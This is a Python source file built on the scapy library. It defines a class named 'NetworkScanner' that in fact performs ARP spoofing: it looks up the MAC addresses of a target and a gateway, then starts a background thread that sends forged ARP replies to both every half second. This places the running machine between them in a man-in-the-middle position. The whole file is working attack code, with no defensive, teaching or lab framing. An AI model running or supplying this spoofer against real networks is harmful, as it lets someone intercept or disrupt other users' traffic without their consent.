from scapy.all import ARP, Ether, srp, send, conf
import threading, time

class NetworkScanner:
    def __init__(self):
        self.arp_thread = None
        self.arp_running = False
        conf.iface = "Wi-Fi"
        conf.verb = 0

    def get_mac(self, ip):
        packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
        ans = srp(packet, timeout=3, retry=3, iface=conf.iface)[0]
        if ans:
            return ans[0][1].hwsrc
        return None

    def arp_spoof(self, target_ip, target_mac, gateway_ip, gateway_mac):
        self.arp_running = True
        packet_target = ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=target_mac)
        packet_gateway = ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst=gateway_mac)

        while self.arp_running:
            send(packet_target, iface=conf.iface)
            send(packet_gateway, iface=conf.iface)
            time.sleep(0.5)

    def start_arp_spoofing(self, target_ip, target_mac_input, gateway_ip):
        if self.arp_running:
            return "ARP spoofing already running"

        target_mac = self.get_mac(target_ip)
        gateway_mac = self.get_mac(gateway_ip)

        if not target_mac:
            return f"Could not find MAC for target ({target_ip})"
        if not gateway_mac:
            return f"Could not find MAC for gateway ({gateway_ip})"

        self.arp_thread = threading.Thread(
            target=self.arp_spoof,
            args=(target_ip, target_mac, gateway_ip, gateway_mac),
            daemon=True
        )
        self.arp_thread.start()

        return f"ARP spoofing started\nTarget MAC: {target_mac}\nGateway MAC: {gateway_mac}"

    def stop_arp_spoofing(self):
        if not self.arp_running:
            return "ARP spoofing is not running"

        self.arp_running = False
        if self.arp_thread and self.arp_thread.is_alive():
            self.arp_thread.join(timeout=1)

        return "ARP spoofing stopped"
